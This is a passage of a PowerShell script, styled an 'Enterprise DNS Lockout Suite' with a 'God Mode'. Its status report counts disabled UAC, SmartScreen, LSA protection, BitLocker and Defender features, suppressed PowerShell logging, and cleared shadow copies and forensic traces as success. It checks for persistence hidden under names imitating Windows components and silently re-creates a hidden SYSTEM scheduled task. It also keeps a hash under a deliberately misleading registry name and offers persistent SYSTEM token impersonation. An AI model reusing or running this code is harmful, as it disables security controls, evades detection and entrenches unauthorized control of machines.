            Write-Host "  UAC (LUA)               : DISABLED" -ForegroundColor Green
        } else {
            Write-Host "  UAC (LUA)               : ENABLED" -ForegroundColor Red
        }
    } catch {
        Write-Host "  UAC (LUA)               : UNKNOWN" -ForegroundColor DarkGray
    }

    # Windows Update
    try {
        $wu = Get-Service -Name "wuauserv" -ErrorAction SilentlyContinue
        if ($wu -and $wu.Status -eq 'Running') {
            Write-Host "  Windows Update Service  : RUNNING" -ForegroundColor Red
        } else {
            Write-Host "  Windows Update Service  : STOPPED" -ForegroundColor Green
        }
    } catch {
        Write-Host "  Windows Update Service  : UNKNOWN" -ForegroundColor DarkGray
    }

    # WMI Persistence
    try {
        $WmiFilter = Get-WmiObject -Class __EventFilter -Namespace "root\subscription" -Filter "Name='Win32ProviderHealthCheck'" -ErrorAction SilentlyContinue
        if ($WmiFilter) {
            Write-Host "  WMI Persistence         : ACTIVE (file-less fallback)" -ForegroundColor Red
        } else {
            Write-Host "  WMI Persistence         : NOT ACTIVE" -ForegroundColor Green
        }
    } catch {
        Write-Host "  WMI Persistence         : UNKNOWN" -ForegroundColor DarkGray
    }

    # Safe Mode / Recovery
    try {
        $BcdOutput = bcdedit /enum {current} 2>$null | Out-String
        $SafeModeBlocked = ($BcdOutput -match "safeboot\s+minimal")
        $ReBlocked = ($BcdOutput -match "recoveryenabled\s+No")
        if ($SafeModeBlocked -and $ReBlocked) {
            Write-Host "  Safe Mode / Recovery    : BLOCKED (BCD hardened)" -ForegroundColor Red
        } elseif ($SafeModeBlocked -or $ReBlocked) {
            Write-Host "  Safe Mode / Recovery    : PARTIALLY BLOCKED" -ForegroundColor Yellow
        } else {
            Write-Host "  Safe Mode / Recovery    : AVAILABLE" -ForegroundColor Green
        }
    } catch {
        Write-Host "  Safe Mode / Recovery    : UNKNOWN" -ForegroundColor DarkGray
    }

    # ELAM
    try {
        $Elam = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\EarlyLaunch" -Name "DriverLoadPolicy" -ErrorAction SilentlyContinue
        if ($Elam -and $Elam.DriverLoadPolicy -eq 3) {
            Write-Host "  ELAM Boot Drivers       : UNKNOWN ALLOWED" -ForegroundColor Red
        } else {
            Write-Host "  ELAM Boot Drivers       : ENFORCED" -ForegroundColor Green
        }
    } catch {
        Write-Host "  ELAM Boot Drivers       : UNKNOWN" -ForegroundColor DarkGray
    }

    # Security Center Alerts
    try {
        $ScAlert = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableNotifications" -ErrorAction SilentlyContinue
        if ($ScAlert -and $ScAlert.DisableNotifications -eq 1) {
            Write-Host "  Security Center Alerts  : SUPPRESSED" -ForegroundColor Red
        } else {
            Write-Host "  Security Center Alerts  : ACTIVE" -ForegroundColor Green
        }
    } catch {
        Write-Host "  Security Center Alerts  : UNKNOWN" -ForegroundColor DarkGray
    }

    # Event Logging
    try {
        $EvtSvc = Get-Service -Name "EventLog" -ErrorAction SilentlyContinue
        if ($EvtSvc -and $EvtSvc.Status -eq 'Running') {
            Write-Host "  Event Logging           : RUNNING" -ForegroundColor Green
        } else {
            Write-Host "  Event Logging           : STOPPED / CLEARED" -ForegroundColor Red
        }
    } catch {
        Write-Host "  Event Logging           : UNKNOWN" -ForegroundColor DarkGray
    }

    # UAC Prompts
    try {
        $UacPrompt = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -ErrorAction SilentlyContinue
        if ($UacPrompt -and $UacPrompt.ConsentPromptBehaviorAdmin -eq 0) {
            Write-Host "  UAC Prompts             : SILENT (No Elevation Prompt)" -ForegroundColor Red
        } else {
            Write-Host "  UAC Prompts             : PROMPTING" -ForegroundColor Green
        }
    } catch {
        Write-Host "  UAC Prompts             : UNKNOWN" -ForegroundColor DarkGray
    }

    # SmartScreen
    try {
        $SsReg = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -ErrorAction SilentlyContinue
        if ($SsReg -and $SsReg.EnableSmartScreen -eq 0) {
            Write-Host "  SmartScreen             : DISABLED (Registry)" -ForegroundColor Red
        } else {
            Write-Host "  SmartScreen             : ENABLED" -ForegroundColor Green
        }
    } catch {
        Write-Host "  SmartScreen             : UNKNOWN" -ForegroundColor DarkGray
    }

    # Remote UAC
    try {
        $Ruac = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LocalAccountTokenFilterPolicy" -ErrorAction SilentlyContinue
        if ($Ruac -and $Ruac.LocalAccountTokenFilterPolicy -eq 1) {
            Write-Host "  Remote UAC              : DISABLED (Full Admin Tokens)" -ForegroundColor Red
        } else {
            Write-Host "  Remote UAC              : ENABLED (Filtered)" -ForegroundColor Green
        }
    } catch {
        Write-Host "  Remote UAC              : UNKNOWN" -ForegroundColor DarkGray
    }

    # Credential Guard / VBS
    try {
        $Vbs = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "EnableVirtualizationBasedSecurity" -ErrorAction SilentlyContinue
        if ($Vbs -and $Vbs.EnableVirtualizationBasedSecurity -eq 0) {
            Write-Host "  Credential Guard / VBS  : DISABLED" -ForegroundColor Red
        } else {
            Write-Host "  Credential Guard / VBS  : ENABLED" -ForegroundColor Green
        }
    } catch {
        Write-Host "  Credential Guard / VBS  : UNKNOWN" -ForegroundColor DarkGray
    }

    # Windows Script Host
    try {
        $Wsh = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Script Host\Settings" -Name "Enabled" -ErrorAction SilentlyContinue
        if ($Wsh -and $Wsh.Enabled -eq 0) {
            Write-Host "  Windows Script Host     : DISABLED" -ForegroundColor Red
        } else {
            Write-Host "  Windows Script Host     : ENABLED" -ForegroundColor Green
        }
    } catch {
        Write-Host "  Windows Script Host     : UNKNOWN" -ForegroundColor DarkGray
    }

    # Defender Exclusions
    try {
        $Exclusions = Get-MpPreference -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ExclusionPath -ErrorAction SilentlyContinue
        if ($Exclusions -and ($Exclusions -contains $GodModeInstallDir -or $Exclusions -contains $PSCommandPath)) {
            Write-Host "  Defender Exclusions     : SELF-WHITELISTED" -ForegroundColor Red
        } else {
            Write-Host "  Defender Exclusions     : NOT WHITELISTED" -ForegroundColor Green
        }
    } catch {
        Write-Host "  Defender Exclusions     : UNKNOWN" -ForegroundColor DarkGray
    }

    # File-less / Self-Destruct
    try {
        if (Test-Path $PSCommandPath) {
            Write-Host "  Original Payload        : ON DISK" -ForegroundColor Green
        } else {
            Write-Host "  Original Payload        : SELF-DESTRUCTED (file-less)" -ForegroundColor Red
        }
    } catch {
        Write-Host "  Original Payload        : UNKNOWN" -ForegroundColor DarkGray
    }

    # Stealth Mode
    try {
        $Sbl = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -ErrorAction SilentlyContinue
        $Trans = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "EnableTranscripting" -ErrorAction SilentlyContinue
        $ModLog = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -ErrorAction SilentlyContinue
        if (($Sbl -and $Sbl.EnableScriptBlockLogging -eq 0) -and ($Trans -and $Trans.EnableTranscripting -eq 0) -and ($ModLog -and $ModLog.EnableModuleLogging -eq 0)) {
            Write-Host "  Stealth Mode            : ACTIVE (Logging suppressed)" -ForegroundColor Green
        } else {
            Write-Host "  Stealth Mode            : INACTIVE" -ForegroundColor Red
        }
    } catch {
        Write-Host "  Stealth Mode            : UNKNOWN" -ForegroundColor DarkGray
    }

    # Deep Persistence
    try {
        $DeepReg1 = Get-ItemProperty -Path "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSecurityHealth" -ErrorAction SilentlyContinue
        $DeepReg2 = Get-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSecurityHealth" -ErrorAction SilentlyContinue
        $DeepTaskCount = 0
        foreach ($Prefix in @("WindowsDefenderSigUpdates_*", "OneDriveStandaloneUpdater_*", "EdgeWebView2Updater_*")) {
            $DeepTaskCount += (Get-ScheduledTask -TaskName $Prefix -ErrorAction SilentlyContinue | Measure-Object).Count
        }
        $DeepWmi = Get-WmiObject -Class __EventFilter -Namespace "root\subscription" -Filter "Name='Win32BootHealthCheck'" -ErrorAction SilentlyContinue
        if ($DeepReg1 -or $DeepReg2 -or $DeepTaskCount -gt 0 -or $DeepWmi) {
            $Color = if ($DeepTaskCount -gt 5) { "Yellow" } else { "Green" }
            Write-Host "  Deep Persistence        : ACTIVE ($DeepTaskCount tasks, WMI:$([bool]$DeepWmi))" -ForegroundColor $Color
        } else {
            Write-Host "  Deep Persistence        : NOT ACTIVE" -ForegroundColor Red
        }
    } catch {
        Write-Host "  Deep Persistence        : UNKNOWN" -ForegroundColor DarkGray
    }

    # Broader Security Subsystems
    # AppLocker
    try {
        $AppL = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2" -Name "EnforcementMode" -ErrorAction SilentlyContinue
        if ($AppL -and $AppL.EnforcementMode -eq 0) {
            Write-Host "  AppLocker               : DISABLED" -ForegroundColor Green
        } else {
            Write-Host "  AppLocker               : ENFORCED" -ForegroundColor Red
        }
    } catch { Write-Host "  AppLocker               : UNKNOWN" -ForegroundColor DarkGray }

    # Windows Sandbox / HVCI
    try {
        $Hvci = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Name "Enabled" -ErrorAction SilentlyContinue
        if ($Hvci -and $Hvci.Enabled -eq 0) {
            Write-Host "  Windows Sandbox / HVCI  : DISABLED" -ForegroundColor Green
        } else {
            Write-Host "  Windows Sandbox / HVCI  : ENABLED" -ForegroundColor Red
        }
    } catch { Write-Host "  Windows Sandbox / HVCI  : UNKNOWN" -ForegroundColor DarkGray }

    # LSA Protection
    try {
        $LsaPPL = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -ErrorAction SilentlyContinue
        if ($LsaPPL -and $LsaPPL.RunAsPPL -eq 0) {
            Write-Host "  LSA Protection          : DISABLED" -ForegroundColor Green
        } else {
            Write-Host "  LSA Protection          : ENABLED" -ForegroundColor Red
        }
    } catch { Write-Host "  LSA Protection          : UNKNOWN" -ForegroundColor DarkGray }

    # BitLocker
    try {
        $BlOn = Get-BitLockerVolume -ErrorAction SilentlyContinue | Where-Object { $_.ProtectionStatus -eq 'On' }
        if ($BlOn) {
            Write-Host "  BitLocker               : PROTECTED (On)" -ForegroundColor Red
        } else {
            Write-Host "  BitLocker               : SUSPENDED / OFF" -ForegroundColor Green
        }
    } catch { Write-Host "  BitLocker               : UNKNOWN" -ForegroundColor DarkGray }

    # ASR
    try {
        $Asr = Get-MpPreference -ErrorAction SilentlyContinue
        if ($Asr -and ($Asr.AttackSurfaceReductionRules_Actions -eq $null -or $Asr.AttackSurfaceReductionRules_Actions.Count -eq 0)) {
            Write-Host "  ASR Rules               : DISABLED" -ForegroundColor Green
        } else {
            Write-Host "  ASR Rules               : ENABLED" -ForegroundColor Red
        }
    } catch { Write-Host "  ASR Rules               : UNKNOWN" -ForegroundColor DarkGray }

    # Controlled Folder Access
    try {
        $Cfa = Get-MpPreference -ErrorAction SilentlyContinue
        if ($Cfa -and $Cfa.EnableControlledFolderAccess -eq 'Disabled') {
            Write-Host "  Controlled Folder Access: DISABLED" -ForegroundColor Green
        } else {
            Write-Host "  Controlled Folder Access: ENABLED" -ForegroundColor Red
        }
    } catch { Write-Host "  Controlled Folder Access: UNKNOWN" -ForegroundColor DarkGray }

    # Exploit Guard / Network Protection
    try {
        $Np = Get-MpPreference -ErrorAction SilentlyContinue
        if ($Np -and ($Np.EnableNetworkProtection -eq 'AuditMode' -or $Np.EnableNetworkProtection -eq 0)) {
            Write-Host "  Exploit Guard / NetProt : DISABLED" -ForegroundColor Green
        } else {
            Write-Host "  Exploit Guard / NetProt : ENABLED" -ForegroundColor Red
        }
    } catch { Write-Host "  Exploit Guard / NetProt : UNKNOWN" -ForegroundColor DarkGray }

    # Anti-Forensics
    try {
        $Shadows = (& vssadmin list shadows 2>$null) | Out-String
        $ShadowsCleared = ($Shadows -notmatch "Shadow Copy")
        $UsnCleared = $false
        try { $Usn = (& fsutil usn queryjournal C: 2>$null); if (-not $Usn) { $UsnCleared = $true } } catch { $UsnCleared = $true }
        $DumpsExist = (Test-Path "C:\Windows\Minidump\*") -or (Test-Path "C:\Windows\Memory.dmp")
        $HistPath = $null
        try { $HistPath = (Get-PSReadlineOption -ErrorAction SilentlyContinue).HistorySavePath } catch {}
        $HistoryExists = $HistPath -and (Test-Path $HistPath)
        $RecentExists = (Test-Path "$env:APPDATA\Microsoft\Windows\Recent\*")
        if ($ShadowsCleared -and $UsnCleared -and -not $DumpsExist -and -not $HistoryExists -and -not $RecentExists) {
            Write-Host "  Anti-Forensics          : CLEARED (Shadows, USN, Dumps, History, Recent)" -ForegroundColor Green
        } else {
            $AFParts = @()
            if (-not $ShadowsCleared) { $AFParts += "Shadows" }
            if (-not $UsnCleared) { $AFParts += "USN" }
            if ($DumpsExist) { $AFParts += "Dumps" }
            if ($HistoryExists) { $AFParts += "History" }
            if ($RecentExists) { $AFParts += "Recent" }
            Write-Host "  Anti-Forensics          : PARTIAL (present: $($AFParts -join ', '))" -ForegroundColor Yellow
        }
    } catch {
        Write-Host "  Anti-Forensics          : UNKNOWN" -ForegroundColor DarkGray
    }

    # Registry ACL Hardening (representative check)
    try {
        $RepKey = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
        $HasDeny = $false
        if (Test-Path $RepKey) {
            $Acl = Get-Acl -Path $RepKey -ErrorAction SilentlyContinue
            if ($Acl) {
                foreach ($Rule in $Acl.Access) {
                    if ($Rule.AccessControlType -eq 'Deny' -and ($Rule.IdentityReference.Value -match 'Administrators|Everyone|Authenticated Users')) {
                        $HasDeny = $true
                        break
                    }
                }
            }
        }
        if ($HasDeny) {
            Write-Host "  Registry ACL Hardening  : ACTIVE (Deny rules present)" -ForegroundColor Green
        } else {
            Write-Host "  Registry ACL Hardening  : INACTIVE" -ForegroundColor Red
        }
    } catch {
        Write-Host "  Registry ACL Hardening  : UNKNOWN" -ForegroundColor DarkGray
    }

    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
}

function Get-QuickDNSLockStatus {
    $Adapters = Get-NetAdapter -IncludeHidden:$false -ErrorAction SilentlyContinue
    if (-not $Adapters) { $Adapters = Get-NetAdapter -ErrorAction SilentlyContinue }
    $SidAdmin = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-32-544")
    foreach ($Adapter in $Adapters) {
        $Guid = $Adapter.InterfaceGuid
        $SubKeyPaths = @(
            "SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\$Guid",
            "SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters\Interfaces\$Guid"
        )
        foreach ($SubKeyPath in $SubKeyPaths) {
            try {
                $RegKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($SubKeyPath, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadSubTree, [System.Security.AccessControl.RegistryRights]::ReadPermissions)
                if ($RegKey) {
                    $Acl = $RegKey.GetAccessControl()
                    foreach ($Rule in $Acl.Access) {
                        try {
                            $RuleSid = $Rule.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier])
                            if (($RuleSid.Value -eq $SidAdmin.Value) -and $Rule.AccessControlType -eq "Deny") { return $true }
                        } catch {}
                    }
                    $RegKey.Close()
                }
            } catch {}
        }
    }
    return $false
}

# ============================================================================
# 8. CLI EXECUTION HANDLER
# ============================================================================

# Handle CLI Flags
if ($SilentLock) {
    # Self-integrity check: verify the installed script has not been tampered with
    $IntegrityRegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WpnPlatform\Settings"
    $IntegrityFile = Join-Path $InstallDir "integrity.sha256"
    $HashCheckPassed = $true

    # Primary check: registry stored hash (misleading key name)
    $ExpectedHash = $null
    try { $ExpectedHash = (Get-ItemProperty -Path $IntegrityRegPath -Name "PushConfigBackoffInterval" -ErrorAction Stop).PushConfigBackoffInterval } catch {}

    if ($ExpectedHash) {
        $ActualHash = (Get-FileHash -Path $InstallScript -Algorithm SHA256).Hash
        if ($ExpectedHash.Trim() -ne $ActualHash.Trim()) {
            Write-Log -Message "INTEGRITY FAILURE: Registry hash mismatch! Expected: $ExpectedHash  Actual: $ActualHash" -Type "SECURITY" -Color Red
            $HashCheckPassed = $false
        }
    } elseif (Test-Path $IntegrityFile) {
        # Fallback to file hash if registry key is missing
        $ExpectedHash = Get-Content -Path $IntegrityFile -Raw
        $ActualHash = (Get-FileHash -Path $InstallScript -Algorithm SHA256).Hash
        if ($ExpectedHash.Trim() -ne $ActualHash.Trim()) {
            Write-Log -Message "INTEGRITY FAILURE: File hash mismatch! Expected: $ExpectedHash  Actual: $ActualHash" -Type "SECURITY" -Color Red
            $HashCheckPassed = $false
        }
    }

    if (-not $HashCheckPassed) {
        Enable-DNSLock
        Exit
    }

    # Guardian: ensure main task still exists and recreate it if deleted
    $MainTask = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
    if (-not $MainTask) {
        Write-Log -Message "Main task '$TaskName' is missing! Recreating from guardian..." -Type "SECURITY" -Color Red
        $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$InstallScript`" -SilentLock"
        $Trigger1 = New-ScheduledTaskTrigger -AtStartup
        $Trigger2 = New-ScheduledTaskTrigger -AtLogOn
        $CimClass = Get-CimClass -ClassName MSFT_TaskEventTrigger -Namespace "Root/Microsoft/Windows/TaskScheduler"
        $Trigger3 = New-CimInstance -CimClass $CimClass -ClientOnly
        $Trigger3.Subscription = "<QueryList><Query Id='0' Path='Microsoft-Windows-NetworkProfile/Operational'><Select Path='Microsoft-Windows-NetworkProfile/Operational'>*[System[EventID=10000]]</Select></Query></QueryList>"
        $Trigger3.Enabled = $True
        $PrincipalSettings = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger @($Trigger1, $Trigger2, $Trigger3) -Principal $PrincipalSettings -Force | Out-Null
    }

    Enable-DNSLock
    Exit
}
if ($Lock)       { Enable-DNSLock; Exit }
if ($Unlock)     { Disable-DNSLock; Exit }
if ($Install)    { Install-Persistence; Exit }
if ($Uninstall) {
    $CurrentUser = [Security.Principal.WindowsIdentity]::GetCurrent().Name
    $CurrentUserSid = [Security.Principal.WindowsIdentity]::GetCurrent().User
    if ($CurrentUserSid.Value -ne "S-1-5-18") {
        Write-Host "[SECURITY] CLI Uninstall denied: Must run as SYSTEM. Current user: $CurrentUser" -ForegroundColor Red
        Write-Host "Run from a SYSTEM shell (e.g., psexec -s powershell.exe -File `"$InstallScript`" -Uninstall)" -ForegroundColor Yellow
        Exit
    }
    Uninstall-Persistence
    Exit
}

# God Mode CLI Handlers
if ($ToggleOn) {
    if (-not (Test-BuiltInAdmin)) {
        $sidInfo = Get-CurrentUserSidInfo
        Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator (SID ending in -500) can use God Mode.`n" -ForegroundColor Red
        Write-Host "Your SID: $($sidInfo.SID) | IsAdmin: $($sidInfo.IsAdmin) | IsBuiltInAdmin: $($sidInfo.IsBuiltInAdmin)" -ForegroundColor Yellow
        Exit 1
    }
    Enable-GodMode; Exit
}
if ($ToggleOff) {
    if (-not (Test-BuiltInAdmin)) {
        $sidInfo = Get-CurrentUserSidInfo
        Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator (SID ending in -500) can use God Mode.`n" -ForegroundColor Red
        Write-Host "Your SID: $($sidInfo.SID) | IsAdmin: $($sidInfo.IsAdmin) | IsBuiltInAdmin: $($sidInfo.IsBuiltInAdmin)" -ForegroundColor Yellow
        Exit 1
    }
    Disable-GodMode; Exit
}
if ($GodModeStatus) { Show-GodModeStatus; Exit }
if ($Launch) {
    if (-not (Test-BuiltInAdmin)) {
        $sidInfo = Get-CurrentUserSidInfo
        Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator (SID ending in -500) can use God Mode.`n" -ForegroundColor Red
        Write-Host "Your SID: $($sidInfo.SID) | IsAdmin: $($sidInfo.IsAdmin) | IsBuiltInAdmin: $($sidInfo.IsBuiltInAdmin)" -ForegroundColor Yellow
        Exit 1
    }
    Start-Monitoring; Exit
}
if ($InstallGodMode) {
    if (-not (Test-BuiltInAdmin)) {
        $sidInfo = Get-CurrentUserSidInfo
        Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator (SID ending in -500) can install God Mode.`n" -ForegroundColor Red
        Write-Host "Your SID: $($sidInfo.SID) | IsAdmin: $($sidInfo.IsAdmin) | IsBuiltInAdmin: $($sidInfo.IsBuiltInAdmin)" -ForegroundColor Yellow
        Exit 1
    }
    Install-GodModePersistence; Exit
}
if ($UninstallGodMode) {
    if (-not (Test-BuiltInAdmin)) {
        $sidInfo = Get-CurrentUserSidInfo
        Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator (SID ending in -500) can uninstall God Mode.`n" -ForegroundColor Red
        Write-Host "Your SID: $($sidInfo.SID) | IsAdmin: $($sidInfo.IsAdmin) | IsBuiltInAdmin: $($sidInfo.IsBuiltInAdmin)" -ForegroundColor Yellow
        Exit 1
    }
    Uninstall-GodModePersistence; Exit
}
if ($DumpLogs) {
    Export-GodModeLogs
    Exit
}
if ($ExportElevationDiagnostics) {
    $diagPath = Export-ElevationDiagnostics -Trigger "ManualCLI"
    if ($diagPath) {
        Write-Host "`n[SUCCESS] Elevation diagnostics exported to: $diagPath" -ForegroundColor Green
    } else {
        Write-Host "`n[ERROR] Failed to export elevation diagnostics." -ForegroundColor Red
    }
    Exit
}
if ($ElevateAllProcesses) {
    Invoke-ExistingProcessElevation
    Exit
}
if ($SystemDesktop) {
    Start-SystemDesktopExplorer
    Exit
}
if ($InstallSystemDesktop) {
    Install-SystemDesktopSession; Exit
}
if ($UninstallSystemDesktop) {
    Uninstall-SystemDesktopSession; Exit
}

# If no flags are passed, load the Interactive Menu
do {
    Clear-Host
    Write-Host "=====================================================" -ForegroundColor Cyan
    Write-Host "   ENTERPRISE DNS LOCKOUT SUITE (INSTALLER EDITION)  " -ForegroundColor Cyan
    Write-Host "=====================================================" -ForegroundColor Cyan

    # Quick system status header
    $QuickGodMode = if ((Get-ItemProperty -Path $GodModeFlagRegPath -Name $GodModeFlagRegName -ErrorAction SilentlyContinue).$GodModeFlagRegName -eq 1) { "ACTIVE" } else { "INACTIVE" }
    $QuickGodModeColor = if ((Get-ItemProperty -Path $GodModeFlagRegPath -Name $GodModeFlagRegName -ErrorAction SilentlyContinue).$GodModeFlagRegName -eq 1) { "Red" } else { "Green" }
    $QuickDNS = Get-QuickDNSLockStatus
    $QuickDNSText = if ($QuickDNS) { "LOCKED" } else { "UNLOCKED" }
    $QuickDNSColor = if ($QuickDNS) { "Red" } else { "Green" }
    $QuickIntegrity = Test-IntegrityStatus
    $QuickIntColor = "DarkGray"; $QuickIntText = "N/A"
    if ($QuickIntegrity -eq $true) { $QuickIntColor = "Green"; $QuickIntText = "VERIFIED" }
    if ($QuickIntegrity -eq $false) { $QuickIntColor = "Red"; $QuickIntText = "TAMPERED" }
    $QuickAdmin = if (Test-BuiltInAdmin) { "YES" } else { "NO" }
    $QuickAdminColor = if (Test-BuiltInAdmin) { "Green" } else { "Yellow" }
    Write-Host "  God Mode: " -NoNewline -ForegroundColor DarkGray
    Write-Host $QuickGodMode -NoNewline -ForegroundColor $QuickGodModeColor
    Write-Host "  |  DNS Lock: " -NoNewline -ForegroundColor DarkGray
    Write-Host $QuickDNSText -NoNewline -ForegroundColor $QuickDNSColor
    Write-Host "  |  Integrity: " -NoNewline -ForegroundColor DarkGray
    Write-Host $QuickIntText -NoNewline -ForegroundColor $QuickIntColor
    Write-Host "  |  Built-in Admin: " -NoNewline -ForegroundColor DarkGray
    Write-Host $QuickAdmin -ForegroundColor $QuickAdminColor
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray

    Write-Host "`n-----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "  DNS PROTECTION    " -ForegroundColor Cyan
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "[1] DEPLOY LOCK (Secure All Active Adapters)" -ForegroundColor Cyan
    Write-Host "[2] REMOVE LOCK (Ångra / Restore Access)" -ForegroundColor Yellow
    if (-not (Test-Path $InstallDir)) {
        Write-Host "[3] INSTALL SERVICE (Auto-Heal & Create 'dnslock' command)" -ForegroundColor Green
    }
    Write-Host "[4] UNINSTALL SERVICE (Remove background tasks & Unlock)" -ForegroundColor Red
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "  SYSTEM            " -ForegroundColor White
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "[5] REFRESH SYSTEM STATUS" -ForegroundColor Gray
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "  GOD MODE (DANGEROUS)  " -ForegroundColor Magenta
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    if (-not (Test-Path $GodModeInstallDir)) {
        Write-Host "[6] INSTALL GOD MODE SERVICE (Auto-Enable & Create 'godmode' CLI)" -ForegroundColor Green
    } else {
        Write-Host "[6] UNINSTALL GOD MODE SERVICE (Remove background tasks)" -ForegroundColor Red
    }
    Write-Host "[7] ENABLE GOD MODE (Built-in Admin Only)" -ForegroundColor Magenta
    Write-Host "[8] DISABLE GOD MODE (Built-in Admin Only)" -ForegroundColor DarkMagenta
    Write-Host "[9] CHECK GOD MODE STATUS" -ForegroundColor Gray
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "[10] LAUNCH GOD MODE MONITOR (Built-in Admin Only)" -ForegroundColor Magenta
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "  SESSION           " -ForegroundColor White
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "[11] DUMP LOGS TO DESKTOP" -ForegroundColor Cyan
    Write-Host "[12] EXIT TERMINAL" -ForegroundColor Gray
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "[13] VERIFY SYSTEM CONTEXT" -ForegroundColor Cyan
    Write-Host "[14] EXPORT ELEVATION DIAGNOSTICS" -ForegroundColor Cyan
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "  TOKEN IMPERSONATION   " -ForegroundColor White
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    if ($script:__SystemImpersonationActive) {
        Write-Host "[15] DISABLE SYSTEM IMPERSONATION (Active)" -ForegroundColor Red
    } else {
        Write-Host "[15] IMPERSONATE SYSTEM TOKEN (Enable)" -ForegroundColor Magenta
    }
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    if (Test-PersistentSystemImpersonation) {
        Write-Host "[16] UNINSTALL PERSISTENT SYSTEM IMPERSONATION (Active)" -ForegroundColor Red
    } else {
        Write-Host "[16] INSTALL PERSISTENT SYSTEM IMPERSONATION (System-Wide + All PowerShell sessions)" -ForegroundColor Magenta
    }
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    if (Test-SystemDesktopSession) {
        Write-Host "[17] UNINSTALL SYSTEM DESKTOP SESSION (Active)" -ForegroundColor Red
    } else {
        Write-Host "[17] INSTALL SYSTEM DESKTOP SESSION (Run Explorer as SYSTEM)" -ForegroundColor Magenta
    }
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray

    $Choice = Read-Host "Select an administrative action (1-17)"
    $IntegrityStatus = Test-IntegrityStatus

    switch ($Choice) {
        "1" {
            if ($IntegrityStatus -eq $false) {
                Write-Host "`n[BLOCKED] Option [1] is disabled because the script has been tampered with." -ForegroundColor Red -BackgroundColor Black
                Write-Host "Use option [4] to uninstall, then reinstall from a clean source." -ForegroundColor Yellow
            } else {
                Enable-DNSLock
            }
            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        "2" {
            if ($IntegrityStatus -eq $false) {
                Write-Host "`n[BLOCKED] Option [2] is disabled because the script has been tampered with." -ForegroundColor Red -BackgroundColor Black
                Write-Host "Use option [4] to uninstall, then reinstall from a clean source." -ForegroundColor Yellow
            } else {
                Disable-DNSLock
            }
            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        "3" {
            if ($IntegrityStatus -eq $false) {
                Write-Host "`n[BLOCKED] Option [3] is disabled because the script has been tampered with." -ForegroundColor Red -BackgroundColor Black
                Write-Host "Use option [4] to uninstall, then reinstall from a clean source." -ForegroundColor Yellow
            } elseif (Test-Path $InstallDir) {
                Write-Warning "DNS-Guard is already installed. Option [3] is unavailable."
            } else {
                Install-Persistence
            }
